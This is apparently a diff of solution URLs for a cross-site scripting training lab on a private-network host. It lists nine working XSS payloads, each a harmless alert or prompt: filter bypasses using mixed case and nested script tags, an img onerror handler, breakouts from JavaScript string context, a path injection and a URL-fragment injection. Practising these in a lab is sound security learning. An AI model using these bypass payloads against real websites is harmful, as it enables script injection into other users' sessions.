@@ -1,1 +1,9 @@
-http://192.168.184.128/xss/example1.php?name=hacker%3Cscript%3Ealert(1)%3C/script%3E
+http://192.168.184.128/xss/example1.php?name=hacker<script>alert(1)</script>
+http://192.168.184.128/xss/example2.php?name=hacker<scriPt>alert(1)</scRipt>
+http://192.168.184.128/xss/example3.php?name=hacker<scri<script>pt>alert(1)</scri</script>pt>
+http://192.168.184.128/xss/example4.php?name=hacker<img src='1' onerror="alert(1)">
+http://192.168.184.128/xss/example5.php?name=hacker<script>prompt()</script>
+http://192.168.184.128/xss/example6.php?name=hacker";alert(1);var b="hacker
+http://192.168.184.128/xss/example7.php?name=hacker';alert(1);var b='hacker
+http://192.168.184.128/xss/example8.php/haha"><script>alert(1)</script><form action="xss/example8.php
+http://192.168.184.128/xss/example9.php#<script>alert(1)</script>
